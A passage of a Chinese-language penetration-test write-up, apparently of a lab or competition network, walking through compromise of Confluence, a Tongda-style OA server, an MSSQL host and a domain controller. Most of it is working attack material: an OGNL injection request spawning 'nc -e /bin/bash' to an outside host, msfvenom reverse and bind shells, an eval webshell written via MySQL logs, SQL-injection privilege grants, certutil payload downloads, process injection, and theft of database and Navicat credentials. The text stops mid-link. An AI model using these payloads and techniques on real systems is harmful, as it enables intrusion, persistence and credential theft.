这里发现发现机器是centos,在linux上Confluence的默认权限为confluence，没有写权限，所以我们这里没办法直接写webshell了。但是这里可以利用centos上的nc先拿到一共shell进行操作。</p><p>上传lcx.exe进行端口转发</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start /min lcx.exe -tran <span class="number">7777</span> <span class="number">172.168</span><span class="number">.1</span><span class="number">.128</span> <span class="number">3333</span></span><br></pre></td></tr></table></figure><p><a href="https://p5.ssl.qhimg.com/t01a58dd09072b3c53a.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01a58dd09072b3c53a.png" alt="img"></a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/pages/doenterpagevariables.action</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.10.129:8000</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 1159</span><br><span class="line"><span class="attribute">Origin</span>: http://192.168.10.129:8000</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.10.129:8000/pages/doenterpagevariables.action</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=67C450235CD839CF8F51DC9E4541FE44</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022                            nc -e /bin/bash 10.1.16.68 7777                                          %5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027</span><br></pre></td></tr></table></figure><p><a href="https://p3.ssl.qhimg.com/t01b3af951a3ea037fe.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01b3af951a3ea037fe.png" alt="img"></a></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure><p>之后可以再上线msf，先做端口转发:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start /min lcx.exe -tran <span class="number">8888</span> <span class="number">172.168</span><span class="number">.1</span><span class="number">.128</span> <span class="number">1111</span></span><br></pre></td></tr></table></figure><p><a href="https://p2.ssl.qhimg.com/t018feb3dc7e4bfcfb3.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t018feb3dc7e4bfcfb3.png" alt="img"></a></p><p><a href="https://p5.ssl.qhimg.com/t019ff5a3b45f3bb88c.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t019ff5a3b45f3bb88c.png" alt="img"></a></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span> LPORT=<span class="number">8888</span> -f elf &gt; test7002.elf</span><br></pre></td></tr></table></figure><p>tmp目录是所有用户共有的临时文件夹，所有用户都拥有读写权限，所以可以将elf写到/tmp下执行。</p><p><a href="https://p5.ssl.qhimg.com/t0126c6f4d76ffac426.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t0126c6f4d76ffac426.png" alt="img"></a></p><p><a href="https://p2.ssl.qhimg.com/t01bddf2cf13237dc27.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t01bddf2cf13237dc27.png" alt="img"></a></p><p>本机的信息收集，查看数据库账号密码:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /var/atlassian/application-data/confluence/confluence.cfg.xml</span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"hibernate.connection.password"</span>&gt;</span>2021ISoon!@#<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/confluence?useUnicode=true<span class="symbol">&amp;amp;</span>characterEncoding=UTF-8<span class="symbol">&amp;amp;</span>useSSL=false<span class="symbol">&amp;amp;</span>sessionVariables=tx_isolation='READ-COMMITTED'<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"hibernate.connection.username"</span>&gt;</span>confluenceuser<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://p4.ssl.qhimg.com/t016a67c938744944e8.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t016a67c938744944e8.png" alt="img"></a></p><p>得到账号密码为</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">confluenceuser</span>   2021ISoon!@<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><a href="https://p1.ssl.qhimg.com/t01afd1c2de0236679c.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t01afd1c2de0236679c.png" alt="img"></a></p><p>查看用户信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,user_name,credential <span class="keyword">from</span> cwd_user;</span><br></pre></td></tr></table></figure><p><a href="https://p5.ssl.qhimg.com/t01410b187c4fea1e01.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01410b187c4fea1e01.png" alt="img"></a></p><p>发现confluence里的密码是加密的，但是我们这里可以重置后台账号密码:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> cwd_user <span class="keyword">SET</span> credential= <span class="string">'&#123;PKCS5S2&#125;UokaJs5wj02LBUJABpGmkxvCX0q+IbTdaUfxy1M9tVOeI38j95MRrVxWjNCu6gsm'</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="number">229377</span>;</span><br></pre></td></tr></table></figure><p>之后使用isoon2021admin/123456登录后台即可</p><p>公告栏获得 flag。</p><p><a href="https://p4.ssl.qhimg.com/t0179a395737174bb32.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t0179a395737174bb32.png" alt="img"></a></p><p>得到oa用户和密码</p><p><a href="https://p2.ssl.qhimg.com/t01d1035e2f61dee479.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t01d1035e2f61dee479.png" alt="img"></a></p><h2 id="0x03-OA"><a href="#0x03-OA" class="headerlink" title="0x03 OA"></a>0x03 OA</h2><p>10.1.16.70</p><p>先看看OA的版本11.7:</p><p><a href="https://p0.ssl.qhimg.com/t019673373f4ac11335.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t019673373f4ac11335.png" alt="img"></a></p><p> 根据拿到的文档表，使用权限高的用户登录。11.7版本后台getshell方法有好几种:<strong>上传.user.ini</strong>、<strong>redis+SSRF组合拳</strong>、<strong>后台sql注入添加用户写weshsell</strong>，这里可以任意选择一种方式拿到webshell。</p><p>演示后台sql注入添加用户写weshsell，添加用户:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.1.16.70/general/hr/manage/query/delete_cascade.php?condition_cascade=<span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">privileges</span> <span class="keyword">ON</span> mysql.* <span class="keyword">TO</span> <span class="string">'cyzcc'</span>@<span class="string">'%'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'abcABC@123'</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span></span><br></pre></td></tr></table></figure><p>远程连接</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u cyzcc -p -h <span class="number">10.1</span><span class="number">.16</span><span class="number">.70</span> -P <span class="number">3336</span></span><br></pre></td></tr></table></figure><p><a href="https://p5.ssl.qhimg.com/t01365dde03deffe83c.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01365dde03deffe83c.png" alt="img"></a></p><p>然后该用户是对mysql数据库拥有所有权限的,然后给自己加权限：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="symbol">`mysql`</span>.<span class="symbol">`user`</span> <span class="keyword">SET</span> <span class="symbol">`Password`</span> = <span class="string">'*DE0742FA79F6754E99FDB9C8D2911226A5A9051D'</span>, <span class="symbol">`Select_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Insert_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Update_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Delete_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Create_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Drop_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Reload_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Shutdown_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Process_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`File_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Grant_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`References_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Index_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Alter_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Show_db_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Super_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Create_tmp_table_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Lock_tables_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Execute_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Repl_slave_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Repl_client_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Create_view_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Show_view_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Create_routine_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Alter_routine_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Create_user_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Event_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Trigger_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Create_tablespace_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`ssl_type`</span> = <span class="string">''</span>, <span class="symbol">`ssl_cipher`</span> = <span class="string">''</span>, <span class="symbol">`x509_issuer`</span> = <span class="string">''</span>, <span class="symbol">`x509_subject`</span> = <span class="string">''</span>, <span class="symbol">`max_questions`</span> = <span class="number">0</span>, <span class="symbol">`max_updates`</span> = <span class="number">0</span>, <span class="symbol">`max_connections`</span> = <span class="number">0</span>, <span class="symbol">`max_user_connections`</span> = <span class="number">0</span>, <span class="symbol">`plugin`</span> = <span class="string">'mysql_native_password'</span>, <span class="symbol">`authentication_string`</span> = <span class="string">''</span>, <span class="symbol">`password_expired`</span> = <span class="string">'Y'</span> <span class="keyword">WHERE</span> <span class="symbol">`Host`</span> = <span class="keyword">Cast</span>(<span class="string">'%'</span> <span class="keyword">AS</span> <span class="keyword">Binary</span>(<span class="number">1</span>)) <span class="keyword">AND</span> <span class="symbol">`User`</span> = <span class="keyword">Cast</span>(<span class="string">'cyzcc'</span> <span class="keyword">AS</span> <span class="keyword">Binary</span>(<span class="number">5</span>));</span><br></pre></td></tr></table></figure><p>然后用注入点刷新权限，因为该用户是没有刷新权限的权限的：<code>general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;</code></p><p><a href="https://p3.ssl.qhimg.com/t01e23361782bbf4cb7.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01e23361782bbf4cb7.png" alt="img"></a></p><p>提示这个，或者让改密码死活改不了。再执行一下</p><p><a href="https://p0.ssl.qhimg.com/t010bc5781b93d050c1.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t010bc5781b93d050c1.png" alt="img"></a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">privileges</span> <span class="keyword">ON</span> mysql.* <span class="keyword">TO</span> <span class="string">'cyzcc'</span>@<span class="string">'%'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'abcABC@123'</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span></span><br></pre></td></tr></table></figure><p>之后就拥有了所有权限</p><p><a href="https://p1.ssl.qhimg.com/t01c0852929ddad08d8.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t01c0852929ddad08d8.png" alt="img"></a></p><p>写马</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查路径：</span></span><br><span class="line"><span class="keyword">select</span> @@basedir; <span class="comment"># c:\MYOA\mysql5\，那么web目录就是c:\MYOA\webroot    # 方法1：</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log=<span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log_file=<span class="string">'C:/MYOA/webroot/cyzcc.php'</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[x]);?&gt;'</span> <span class="keyword">or</span> <span class="keyword">sleep</span>(<span class="number">11</span>);</span><br><span class="line"><span class="comment"># 方法2：</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file = <span class="string">'C:/MYOA/webroot/cyzcc.php'</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[x]);?&gt;'</span>;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%general%'</span>;</span><br></pre></td></tr></table></figure><p><a href="https://p5.ssl.qhimg.com/t01007ac8fdc66dd501.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01007ac8fdc66dd501.png" alt="img"></a></p><p><a href="https://p1.ssl.qhimg.com/t0197c67e333d446b1a.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t0197c67e333d446b1a.png" alt="img"></a></p><p><a href="https://p0.ssl.qhimg.com/t01d52523628ac7677c.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t01d52523628ac7677c.png" alt="img"></a></p><p><a href="https://p4.ssl.qhimg.com/t015880097e01ed5dc7.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t015880097e01ed5dc7.png" alt="img"></a></p><p>上去是system权限，这里本来还想考察一个com组件绕过disable_functions。</p><p><a href="https://p3.ssl.qhimg.com/t01bbf91016a3f760cd.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01bbf91016a3f760cd.png" alt="img"></a></p><p>上线msf,正向shell：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp <span class="attribute">LPORT</span>=1234 -f exe  &gt; bind_shell.exe</span><br></pre></td></tr></table></figure><p>将bind_shell.exe上传到oa机器，运行即可收到bind shell</p><p><a href="https://p0.ssl.qhimg.com/t01e28fbcde11711e1d.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t01e28fbcde11711e1d.png" alt="img"></a></p><p>为了方便之后的操作，我们将shell转到CS上操作:</p><p>翻一下桌面找到flag:</p><p><a href="https://p4.ssl.qhimg.com/t013aaac66d1ca48828.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t013aaac66d1ca48828.png" alt="img"></a></p><p> 本机信息收集，在C盘根目录下看到了服务器安装了Navicat,猜测Navicat里可能保存了数据库的账号和密码。</p><p><a href="https://p5.ssl.qhimg.com/t01391c3be26d2cff88.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01391c3be26d2cff88.png" alt="img"></a></p><p>Navicat 中保存的所有连接账密，都是直接存到对应注册表项值下的。</p><p>各个数据库连接账密具体存放位置:</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MySQL HKEY_CURRENT_USER<span class="tag">\<span class="name">Software</span></span><span class="tag">\<span class="name">PremiumSoft</span></span><span class="tag">\<span class="name">Navicat</span></span><span class="tag">\<span class="name">Servers</span></span><span class="tag">\</span></span><br><span class="line">MariaDB HKEY_CURRENT_USER<span class="tag">\<span class="name">Software</span></span><span class="tag">\<span class="name">PremiumSoft</span></span><span class="tag">\<span class="name">NavicatMARIADB</span></span><span class="tag">\<span class="name">Servers</span></span><span class="tag">\</span></span><br><span class="line">Microsoft SQL HKEY_CURRENT_USER<span class="tag">\<span class="name">Software</span></span><span class="tag">\<span class="name">PremiumSoft</span></span><span class="tag">\<span class="name">NavicatMSSQL</span></span><span class="tag">\<span class="name">Servers</span></span><span class="tag">\</span></span><br><span class="line">Oracle HKEY_CURRENT_USER<span class="tag">\<span class="name">Software</span></span><span class="tag">\<span class="name">PremiumSoft</span></span><span class="tag">\<span class="name">NavicatOra</span></span><span class="tag">\<span class="name">Servers</span></span><span class="tag">\</span></span><br><span class="line">PostgreSQL HKEY_CURRENT_USER<span class="tag">\<span class="name">Software</span></span><span class="tag">\<span class="name">PremiumSoft</span></span><span class="tag">\<span class="name">NavicatPG</span></span><span class="tag">\<span class="name">Servers</span></span><span class="tag">\</span></span><br><span class="line">MongoDB HKEY_CURRENT_USER<span class="tag">\<span class="name">Software</span></span><span class="tag">\<span class="name">PremiumSoft</span></span><span class="tag">\<span class="name">NavicatMongoDB</span></span></span><br><span class="line">SQLite HKEY_CURRENT_USER<span class="tag">\<span class="name">Software</span></span><span class="tag">\<span class="name">PremiumSoft</span></span><span class="tag">\<span class="name">NavicatSQLite</span></span><span class="tag">\<span class="name">Servers</span></span><span class="tag">\</span></span><br></pre></td></tr></table></figure><p> 但是我们这里直接在system权限下进行查询是查不到的。尝试查询当前用户的所有连接记录:</p><p><a href="https://p3.ssl.qhimg.com/t01047217fd287af362.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01047217fd287af362.png" alt="img"></a></p><p> system进程、服务若要操作用户注册表（HKEY_CURRENT_USER）,如果直接操作注册表会被重定向到HKEY_USERS。所以我们这里需要进行从sys-admin的降权操作。</p><p>这里利用Cobalt Strike的进程注入实现降权(msf同理)：</p><p>查看具有administrator权限的系统进程</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist <span class="string">/v</span> <span class="string">/fo</span> list</span><br></pre></td></tr></table></figure><p>将Payload注入到新进程中去：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject <span class="number">5732</span> x64</span><br></pre></td></tr></table></figure><p>获得一个administrator权限的beacon。</p><p>查询mssql的连接账密</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># reg query HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\P</span>remiumSoft<span class="symbol">\N</span>avicatMSSQL<span class="symbol">\S</span>ervers<span class="symbol">\ </span>/s /v host 数据库连接 ip</span><br><span class="line"># reg query HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\P</span>remiumSoft<span class="symbol">\N</span>avicatMSSQL<span class="symbol">\S</span>ervers<span class="symbol">\ </span>/s /v UserName 数据库用户名</span><br><span class="line"># reg query HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\P</span>remiumSoft<span class="symbol">\N</span>avicatMSSQL<span class="symbol">\S</span>ervers<span class="symbol">\ </span>/s /v pwd 数据库用户名对应的密码 hash</span><br><span class="line"># reg query HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\P</span>remiumSoft<span class="symbol">\N</span>avicatMSSQL<span class="symbol">\S</span>ervers<span class="symbol">\ </span>/s /v Port 数据库连接端口，默认 16 进制数值</span><br></pre></td></tr></table></figure><p>之后，我们把拿到的hash复制回来本地解密即可。</p><p>其实有一键化的工具可以直接跑：</p><p><a href="https://github.com/uknowsec/SharpDecryptPwd" target="_blank" rel="noopener">https://github.com/uknowsec/SharpDecryptPwd</a></p><p><a href="https://p1.ssl.qhimg.com/t0166cf5f84259f8c3a.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t0166cf5f84259f8c3a.png" alt="img"></a></p><h2 id="0x04-db-iSoon2021-lab"><a href="#0x04-db-iSoon2021-lab" class="headerlink" title="0x04 db.iSoon2021.lab"></a>0x04 db.iSoon2021.lab</h2><p> 本地挂上代理，使用navicat连接内网mssql，启用目标 mssql 的 xp_cmdshell可以执行命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master.dbo.xp_cmdshell <span class="string">'whoami'</span>;</span><br></pre></td></tr></table></figure><p><a href="https://p5.ssl.qhimg.com/t01a81bd20a5f96f4bb.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01a81bd20a5f96f4bb.png" alt="img"></a></p><p> 发现权限是一个受限的service\mssql$sqlexpress服务账户权限,但是在域里，<strong>服务的权限为Local System 或 Network Service都会注册在活动目录的机器帐户下</strong>，所以我们我们这里其实已经入域了。</p><p><a href="https://p1.ssl.qhimg.com/t0199cce3423914ef7f.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t0199cce3423914ef7f.png" alt="img"></a></p><p>通过使用certutil.exe下载远程的可执行文件，可执行文件可以放在OA服务器或者wordpress上。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_cmdshell '<span class="keyword">cd</span> c:\\<span class="keyword">test</span> &amp; certutil -urlcache -<span class="keyword">split</span> -f http:<span class="comment">//10.10.211.142/beacon999.exe';</span></span><br></pre></td></tr></table></figure><p>执行程序，反弹到CS上操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master.dbo.xp_cmdshell <span class="string">'cd c:\\test &amp; beacon999.exe'</span>;</span><br></pre></td></tr></table></figure><p>Network Service(<strong>NT AUTHORITY\Network Service</strong>)属于Windows服务的登陆账户，拥有<strong>SeImpersonatePrivilege</strong>权限，所以这里是可以利用potato进行提权操作。</p><p>但是这里需要注意要提权的机器是不出网的，所以我们这里要想反弹shell，还需要经过端口转发或者在入口点经过http代理上线CS或者MSF。</p><p><a href="https://p1.ssl.qhimg.com/t01e1e58502fbe508cb.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t01e1e58502fbe508cb.png" alt="img"></a></p><p>这里其实不提权也可以，不妨碍对域进行攻击。</p><h2 id="0x05-dc2-net-iSoon2021-lab"><a href="#0x05-dc2-net-iSoon2021-lab" class="headerlink" title="0x05 dc2.net.iSoon2021.lab"></a>0x05 dc2.net.iSoon2021.lab</h2><p>简单域信息收集。发现域内一共就三台机器，其中两台域控，一台db服务器。</p><p><a href="https://p2.ssl.qhimg.com/t015d939f00a8b7057c.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t015d939f00a8b7057c.png" alt="img"></a></p><p>所以更多的往能够直接打域控的方式上靠。</p><p>常见的域提权方式:</p><ul><li>权限配置不当:ACL,DNSadmin,GPO等等</li><li>组策略GPP和SYSVOL中的密码</li><li>kerberosating</li><li>zerologon</li><li>ms14-068</li><li>基于委派的测试</li><li>printNightmare</li><li>relay</li></ul><p>如果这里信息收集没找到adcs服务的话:</p><p> 回到我们现在受控的db服务器上面进行信息收集，提到system权限后，然后降权，发现机器上面有火狐浏览器，降权之后抓一下历史记录，(或者直接3389连上去找)可以看到:</p><p><a href="https://p4.ssl.qhimg.com/t01eb5dfc3907273d41.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01eb5dfc3907273d41.png" alt="img"></a></p><p>访问发现是域证书服务，可以使用certutil命令来定位域内的CA服务器</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">certutil -CA</span></span><br></pre></td></tr></table></figure><p><a href="https://p5.ssl.qhimg.com/t01923e438527a12498.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01923e438527a12498.png" alt="img"></a></p><p> 发现在DC1上安装域证书服务，想到今年blackhat2021公开的关于ADCS的攻击方式，其中国内讨论较多的可能就是ADCS ESC8 也被叫做ADCS Relay，是目前ADCS里面利用最广的一个洞。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于<span class="keyword">ADCS的http证书接口没有启用NTLM中继保护，因此其易受NTLM </span>Relay攻击。而且Authorization HTTP 标头明确只允许通过 NTLM 身份验证，因此Kerberos协议无法使用。因此，攻击者可以利用NTLM Relay攻击<span class="keyword">ADCS证书服务。</span></span><br></pre></td></tr></table></figure><p>具体可以参考白皮书:</p><p><a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf" target="_blank" rel="noopener">https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf</a></p><p><strong>ADCS大致攻击思路:</strong></p><ul><li>攻击者利用漏洞，强制域控使用机器账户发起ntlm认证请求</li><li>之后将请求relay到证书服务的http接口，通过验证获得域机器账户的身份</li><li>利用证书模板为机器用户申请证书，方便之后持久性获取该用户权限</li><li>最后利用申请到的证书进行认证，就能拿到机器用户也就是域控的权限。</li></ul><p><strong>但是我们这里利用有几个问题需要解决:</strong></p><p> 一是我们这里探测发现打印机服务是关闭的，这里需要利用加密文件系统 (EFS) 的RPC协议。和之前的<code>printer bug</code>利用类似，EFS 的 rpc，允许恶意<code>域用户/或机器账号</code>控制<code>其它机器</code>外发认证.</p><p> 二是我们这里想要进行relay攻击需要利用工具来监听本地445端口，而在windows上445端口是占用的，并且目标机器在内网，且不出网，所以我们这里需要进行流量重定向和端口转发操作。</p><p>如果受控机上线了CS，可以直接使用PortBender这个插件:</p><p><a href="https://www.freebuf.com/articles/network/305106.html" target="_blank" 